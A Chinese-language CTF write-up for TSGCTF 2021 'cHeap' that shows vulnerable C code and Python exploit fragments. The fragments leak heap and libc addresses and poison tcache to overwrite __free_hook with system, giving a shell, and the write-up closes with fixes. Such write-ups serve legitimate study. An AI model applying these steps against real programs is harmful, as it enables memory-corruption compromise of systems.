# TSGCTF2021 cHeap WP

## 题目简述

程序只有一个全局堆指针，却同时存在三类漏洞：

```c
char *ptr = NULL;

void create(void) {
    unsigned size;
    scanf("%u", &size);
    ptr = malloc(size);
    readn(ptr, 0x100);
}

void show(void)   { printf("%s\n", ptr); }
void delete(void) { free(ptr); }
```

`create` 无论申请多大都允许写入 0x100 字节，可造成 heap overflow；`delete` 不清空指针，可重复释放；`show` 又能读取已释放块。题目使用 glibc 2.31，尚无 safe-linking，tcache 单链表指针可直接伪造。

## 解题过程

先依次申请并释放用户大小为 `0x30、0x40、0x10、0x20` 的块，在多个 tcache bin 中建立可预测布局。随后重新申请 `0x40`，写入：

```python
b"A" * 0x48 + p64(0x41)
```

前 0x40 字节填满当前块，越界数据修改相邻块头，把其 size 伪造成 `0x41`。配合后续申请、释放和悬空 `show()`，可以读到 tcache `fd` 中的堆指针：

```python
heap_base = u64(show().ljust(8, b"\x00")) - 0x2a0
```

有了堆基址后，再通过同类越界把一个 tcache 链指针改成 `heap_base + 0x380`。两次对应大小的申请后，`malloc` 返回这个受控堆位置；把伪造的大块释放进 unsorted bin，悬空 `show()` 就会输出写入其中的 `main_arena` 指针：

```python
libc_base = u64(show().ljust(8, b"\x00")) - 0x1ebbe0
```

这些偏移只适用于题目附带的 glibc 2.31。得到 libc 基址后，目标地址为：

```python
free_hook = libc_base + 0x1eeb28
system = libc_base + 0x55410
```

重新执行一次堆布局和 size 覆盖，把 tcache `fd` 污染为 `__free_hook`。连续两次申请同一大小后，第二次分配落到 hook，并写入 `system`：

```python
create(0x40, b"Z" * 0x50 + p64(free_hook))
create(0x30, b"padding")
create(0x30, p64(system))
```

最后申请保存 `/bin/sh\0` 的块并释放。`free(ptr)` 经 `__free_hook` 实际调用 `system(ptr)`，获得 shell。flag 为：

```text
TSGCTF{Heap_overflow_is_easy_and_nice_yeyey}
```

## 方法总结

单指针界面没有阻止堆利用，因为悬空指针提供泄露，固定 0x100 字节写入提供跨 chunk 覆盖，未启用 safe-linking 的 tcache 又允许直接伪造下一节点。利用依次完成堆基址泄露、unsorted-bin libc 泄露和 `__free_hook` 劫持。修复应把读取上限绑定到实际申请大小，释放后立即清空指针，并升级到具有现代分配器加固的运行环境；但分配器缓解不能替代正确的对象生命周期和边界检查。
